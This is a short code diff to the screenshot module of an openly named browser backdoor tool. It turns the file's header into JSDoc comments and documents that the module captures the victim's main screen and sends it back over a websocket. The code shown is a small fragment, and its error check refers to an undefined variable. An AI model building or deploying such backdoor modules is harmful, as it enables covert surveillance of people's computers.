@@ -1,12 +1,10 @@
-/*
- * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Takes a screenshot of the main screen.
- * Parameters: None
- * Returns: undefined, Data URL of screenshot
- * Author: IMcPwn
+/**
+ * @file screenshot Module
+ * @summary Takes a screenshot of the client system's main screen.
+ * @author IMcPwn 
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron');
@@ -21,6 +19,9 @@ path = require('path');
 thumbSize = determineScreenShotSize();
 options = { types: ['screen'], thumbnailSize: thumbSize };
 
+/**
+ * @return {String} "Screenshot data URL: " + Base64 encoded screenshot
+ */
 desktopCapturer.getSources(options, function (err, sources) {
     if (error) {
         ws.send("Error: " + err.toString());
